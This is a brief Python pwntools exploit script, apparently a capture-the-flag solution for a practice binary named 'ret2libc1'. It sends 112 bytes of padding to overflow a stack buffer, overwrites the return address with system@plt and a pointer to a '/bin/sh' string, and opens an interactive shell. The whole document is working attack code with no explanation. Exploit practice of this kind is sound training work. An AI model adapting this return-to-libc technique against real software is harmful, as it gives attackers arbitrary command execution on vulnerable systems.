from pwn import *
io = process("./ret2libc1")
trash = b'a'*(108+4)
sys_plt = 0x8048460
bin_sh = 0x8048720
payload = flat([trash,sys_plt,b'a'*4,bin_sh]) 
io.sendline(payload)
io.interactive()
